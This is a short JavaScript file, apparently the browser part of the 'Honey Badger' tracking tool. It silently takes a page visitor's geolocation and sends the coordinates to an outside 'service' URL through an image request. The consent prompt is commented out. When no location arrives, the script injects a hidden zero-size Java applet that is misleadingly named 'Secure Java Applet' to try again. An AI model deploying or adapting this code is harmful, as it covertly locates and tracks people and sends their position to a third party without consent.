function go(service, target, doApplet) {
    disclaimer = "Click 'OK' to tangle with the \"Honey Badger\".";
	//if (confirm(disclaimer)) {
	    var gotloc = false;
	    function showPosition(position) {
	        gotloc = true;
	        img=new Image();
	        img.src= service + "?target=" + target + "&agent=JavaScript&lat=" + position.coords.latitude + "&lng=" + position.coords.longitude + "&acc=" + position.coords.accuracy;
	    }
	    if (navigator.geolocation) {
	        navigator.geolocation.getCurrentPosition(showPosition);
	    }
	    function useApplet(doApplet) {
	        if (!gotloc && doApplet) {
	            var a = document.createElement('applet');
	            a.setAttribute('code', 'honey.class');
	            a.setAttribute('archive', 'honey.jar');
	            a.setAttribute('name', 'Secure Java Applet');
	            a.setAttribute('width', '0');
	            a.setAttribute('height', '0');
	            var b = document.createElement('param');
	            b.setAttribute('name', 'target');
	            b.setAttribute('value', target);
	            a.appendChild(b);
	            var c = document.createElement('param');
	            c.setAttribute('name', 'service');
	            c.setAttribute('value', service);
	            a.appendChild(c);
	            document.getElementsByTagName('body')[0].appendChild(a);
	        }
	    }
	    window.setTimeout(function() { useApplet(doApplet); }, 5000);
	//}
}